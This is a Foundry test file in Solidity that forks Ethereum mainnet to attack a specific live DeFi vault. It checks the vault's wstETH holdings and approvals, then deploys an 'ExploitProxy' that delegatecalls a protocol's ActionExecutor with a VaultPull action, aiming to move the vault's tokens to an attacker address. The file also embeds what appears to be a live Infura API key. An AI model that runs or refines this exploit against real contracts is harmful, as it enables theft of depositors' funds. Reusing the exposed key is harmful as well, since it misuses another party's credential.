// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IActionExecutor {
    function executeActions(
        bytes4[] calldata _actionIds,
        bytes[] calldata _actionCallData,
        uint8[][] calldata _paramMapping
    ) external payable;
}

interface IActionRegistry {
    function getAddr(bytes4 _id) external view returns (address);
}

interface IStrategy {
    function vault() external view returns (address);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract VaultPullExploit is Test {
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;
    address constant ACTION_REGISTRY = 0x94aF5994EB6841e1D930C95AD0C9F89771c3073F;
    
    bytes4 constant VAULT_PULL_ID = 0xfebcb52a;
    bytes4 constant AAVE_WITHDRAW_ID = 0x72a6498a;
    
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant aWstETH = 0x0B925eD163218f6662a35e0f0371Ac234f9E9371;
    
    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeVaultPullBytecode() public view {
        console.log("=== ANALYZING VAULT PULL ACTION ===\n");
        
        address vaultPullAction = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        console.log("VaultPull action:", vaultPullAction);
        
        bytes memory code = vaultPullAction.code;
        console.log("Code size:", code.length);
        
        // VaultPull likely does:
        // 1. Get vault address from IStrategy(address(this)).vault()
        // 2. Call vault.withdraw(token, amount) or similar
        // 3. Tokens end up in address(this) (the Strategy)
        
        // Key selectors to look for:
        console.log("\nKey selectors:");
        console.log("vault():");
        console.logBytes4(bytes4(keccak256("vault()")));
        console.log("withdraw(address,uint256):");
        console.logBytes4(bytes4(keccak256("withdraw(address,uint256)")));
        console.log("withdrawToStrategy(uint256,uint256):");
        console.logBytes4(bytes4(keccak256("withdrawToStrategy(uint256,uint256)")));
    }
    
    function test_AnalyzeVaultFunctions() public view {
        console.log("=== ANALYZING VAULT FUNCTIONS ===\n");
        
        console.log("Vault:", VAULT);
        
        // Check vault balance
        uint256 vaultWstETH = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH balance:", vaultWstETH / 1e18);
        console.log("Value: ~$", (vaultWstETH / 1e18) * 2300);
        
        // Try to identify vault functions
        // Check if vault is ERC4626
        (bool success, bytes memory data) = VAULT.staticcall(
            abi.encodeWithSignature("asset()")
        );
        if (success && data.length == 32) {
            address asset = abi.decode(data, (address));
            console.log("\nVault asset (ERC4626):", asset);
        }
        
        // Check totalAssets
        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("totalAssets()")
        );
        if (success && data.length == 32) {
            uint256 total = abi.decode(data, (uint256));
            console.log("Vault totalAssets:", total / 1e18);
        }
        
        // Check if there's an owner
        (success, data) = VAULT.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length == 32) {
            address owner = abi.decode(data, (address));
            console.log("Vault owner:", owner);
        }
    }
    
    function test_VaultApprovals() public view {
        console.log("=== VAULT TOKEN APPROVALS ===\n");
        
        // Check what addresses Vault has approved for wstETH
        // This is critical - if Vault approved some contract,
        // and that contract can be tricked...
        
        address[] memory potentialSpenders = new address[](15);
        potentialSpenders[0] = STRATEGY_0;
        potentialSpenders[1] = ACTION_EXECUTOR;
        potentialSpenders[2] = IActionRegistry(ACTION_REGISTRY).getAddr(VAULT_PULL_ID);
        potentialSpenders[3] = IActionRegistry(ACTION_REGISTRY).getAddr(AAVE_WITHDRAW_ID);
        potentialSpenders[4] = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e; // StrategyExecutor
        potentialSpenders[5] = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47; // StrategyStorage
        potentialSpenders[6] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Owner
        potentialSpenders[7] = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510; // Found earlier
        potentialSpenders[8] = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2; // Aave
        potentialSpenders[9] = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // wstETH
        potentialSpenders[10] = 0x5aE0e44DE96885702bD99A6914751C952d284938; // Strategy 1
        potentialSpenders[11] = 0xB27D688Ac06a441c005657971B11521e80CdcE98; // Strategy 2
        potentialSpenders[12] = 0xbfdF0aF6Df48E645Bd076802B95DDEf0b1E02a9d; // Strategy 3
        potentialSpenders[13] = address(0);
        potentialSpenders[14] = attacker;
        
        console.log("Checking Vault wstETH approvals:");
        for (uint i = 0; i < potentialSpenders.length; i++) {
            if (potentialSpenders[i] == address(0)) continue;
            uint256 allowance = IERC20(wstETH).allowance(VAULT, potentialSpenders[i]);
            if (allowance > 0) {
                console.log("Spender:", potentialSpenders[i]);
                console.log("  Allowance:", allowance);
                if (allowance == type(uint256).max) {
                    console.log("  *** MAX APPROVAL ***");
                }
            }
        }
    }
    
    function test_ExploitViaMaliciousProxy() public {
        console.log("=== EXPLOIT VIA MALICIOUS PROXY ===\n");
        
        vm.startPrank(attacker);
        
        // Deploy a proxy that returns controlled values
        ExploitProxy proxy = new ExploitProxy(VAULT, attacker);
        console.log("Exploit proxy:", address(proxy));
        console.log("proxy.vault():", proxy.vault());
        
        // Now if we call ActionExecutor.executeActions via delegatecall
        // from our proxy, address(this) in actions = proxy
        // And if action calls IStrategy(address(this)).vault(), it gets REAL vault
        
        // But VaultPull likely does:
        // IVaultWithdrawer(vault).withdraw(token, amount)
        // Which would call REAL vault's withdraw
        // But REAL vault wouldn't send to random caller...
        
        // UNLESS: VaultPull does transferFrom(vault, address(this), amount)
        // And vault has approved some address that we can impersonate
        
        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);
        
        // Prepare VaultPull action data
        // Likely: (address token, uint256 amount)
        bytes memory vaultPullData = abi.encode(wstETH, type(uint256).max);
        
        bytes4[] memory actionIds = new bytes4[](1);
        actionIds[0] = VAULT_PULL_ID;
        
        bytes[] memory actionCalldata = new bytes[](1);
        actionCalldata[0] = vaultPullData;
        
        uint8[][] memory paramMapping = new uint8[][](1);
        paramMapping[0] = new uint8[](2);
        
        bytes memory executeData = abi.encodeWithSelector(
            IActionExecutor.executeActions.selector,
            actionIds,
            actionCalldata,
            paramMapping
        );
        
        try proxy.execute(ACTION_EXECUTOR, executeData) returns (bytes32 result) {
            console.log("Execute succeeded!");
            console.logBytes32(result);
        } catch Error(string memory reason) {
            console.log("Execute failed:", reason);
        } catch (bytes memory lowLevelData) {
            console.log("Execute failed (raw):");
            if (lowLevelData.length > 0 && lowLevelData.length < 200) {
                console.logBytes(lowLevelData);
            }
        }
        
        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 proxyBalance = IERC20(wstETH).balanceOf(address(proxy));
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);
        
        console.log("\nResults:");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Proxy wstETH:", proxyBalance / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);
        
        vm.stopPrank();
    }
    
    function test_AnalyzeVaultCode() public view {
        console.log("=== VAULT CODE ANALYSIS ===\n");
        
        bytes memory code = VAULT.code;
        console.log("Vault code size:", code.length);
        
        // Check for specific patterns
        // transferFrom selector: 0x23b872dd
        // transfer selector: 0xa9059cbb
        // withdraw selectors
        
        bytes4 withdrawSel = bytes4(keccak256("withdraw(uint256,address,address)"));
        bytes4 redeemSel = bytes4(keccak256("redeem(uint256,address,address)"));
        
        console.log("ERC4626 withdraw selector:");
        console.logBytes4(withdrawSel);
        console.log("ERC4626 redeem selector:");
        console.logBytes4(redeemSel);
    }
}

contract ExploitProxy {
    address public vault;
    address public owner;
    
    constructor(address _vault, address _owner) {
        vault = _vault;
        owner = _owner;
    }
    
    function execute(address _target, bytes memory _data) external payable returns (bytes32 response) {
        require(msg.sender == owner, "Not owner");
        
        assembly {
            let succeeded := delegatecall(gas(), _target, add(_data, 0x20), mload(_data), 0, 32)
            response := mload(0)
            
            switch succeeded
            case 0 {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
    
    // Mimic Strategy interface
    function strategyStorage() external pure returns (address) {
        return address(0);
    }
    
    receive() external payable {}
}
